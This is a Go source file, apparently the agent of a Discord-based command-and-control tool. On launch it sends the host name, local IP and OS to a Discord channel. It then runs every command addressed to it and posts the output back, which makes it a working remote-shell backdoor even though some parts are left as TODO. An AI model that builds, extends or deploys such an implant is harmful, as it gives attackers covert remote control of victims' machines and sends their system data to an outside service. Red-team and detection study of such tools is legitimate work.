package main

import (
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"syscall"

	"DiscordGo/pkg/agent"
	"DiscordGo/pkg/message"
	"DiscordGo/pkg/util"
	"DiscordGo/pkg/util/constants"

	"github.com/bwmarrin/discordgo"
)


var newAgent *agent.Agent

// Create an Agent 
func init(){
	newAgent = &agent.Agent{}
	newAgent.UUID = util.GenerateUUID()
	newAgent.HostName, _ = os.Hostname()
	newAgent.IP = util.GetLocalIP()

	sys := "Unknown"
	if runtime.GOOS == "windows"{
		sys = "Windows"
	} else if runtime.GOOS == "linux"{
		sys = "Linux"
	} else if runtime.GOOS == "darwin" {
		sys = "MacOS"
	}

	newAgent.OS = sys
}

func main(){
	dg, err := discordgo.New("Bot " + constants.BotToken)
	if err != nil {
		fmt.Println("error creating Discord session,", err)
		return
	}

	fmt.Println("New Agent Info")
	fmt.Println(newAgent.HostName)
	fmt.Println(newAgent.UUID)
	fmt.Println(newAgent.IP)
	fmt.Println(newAgent.OS)
	fmt.Println()

	firstMessage := newAgent.HostName + ":" + newAgent.IP + ":" + newAgent.OS
	sendMessage := message.NewMessage(newAgent.UUID, firstMessage, false, message.MESSAGE_NEW);
	dg.ChannelMessageSend(constants.ChannelID, sendMessage)

	// Register the messageCreate func as a callback for MessageCreate events.
	dg.AddHandler(messageCreator)

	// TODO: Reconnect back to server 
	//agent --> I'm alive
	// server <--- I see you
	// agnet --> okay
	//=======^ if server is up
	//agent --> I'm alive
	// server <---- N/A
	// agent --> keeps trying
	// ping the server every minute for now
	// pulseDelay := time.Duration(60)
	// tick := time.NewTicker(time.Second * pulseDelay)
	// go heartbeat(dg, tick)
	// go heartBeat()

	// Open a websocket connection to Discord and begin listening.
	err = dg.Open()
	if err != nil {
		fmt.Println("error opening connection,", err)
		return
	}

	// Wait here until CTRL-C or other term signal is received.
	fmt.Println("Agent is now running.  Press CTRL-C to exit.")
	sc := make(chan os.Signal, 1)
	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt, os.Kill)
	<-sc

	lastMessage := "[-] Agent " + newAgent.UUID + " has disconnected"
	sendLMessage := message.NewMessage(newAgent.UUID, lastMessage, false, message.MESSAGE_DISCONNECT)
	dg.ChannelMessageSend(constants.ChannelID, sendLMessage)

	// Cleanly close down the Discord session.
	dg.Close()

}

func messageCreator(dg *discordgo.Session, m *discordgo.MessageCreate){

	var messageJSON message.Message
	json.Unmarshal([]byte(m.Content), &messageJSON)

	// Check if the message is for me
	forMe := false

	if messageJSON.AgentID == newAgent.UUID {
		forMe = true
	}

	if forMe {
		if messageJSON.MessageType == message.MESSAGE_COMMAND {
			result := executeCommand(messageJSON.Message)
			sendMessage := message.NewMessage(newAgent.UUID, result, false, message.MESSAGE_OUTPUT)
			dg.ChannelMessageSend(constants.ChannelID, sendMessage) 
		} else if messageJSON.MessageType == message.MESSAGE_PING {
			fmt.Println("Pong")
		} else if messageJSON.MessageType == message.MESSAGE_KILL {

		}
	}
}

func heartBeat() {

}

func executeCommand(command string) string{
	fmt.Println("Received command: " + command)
	// TODO: What if the commmand has arguments or pipe

	result := ""

	output, err := exec.Command(command).Output()
	if err != nil {
		// maybe send error to server
		fmt.Println("Couldn't execute command")
	}

	result = string(output)
	fmt.Println("Result: " + result)

	return result
}


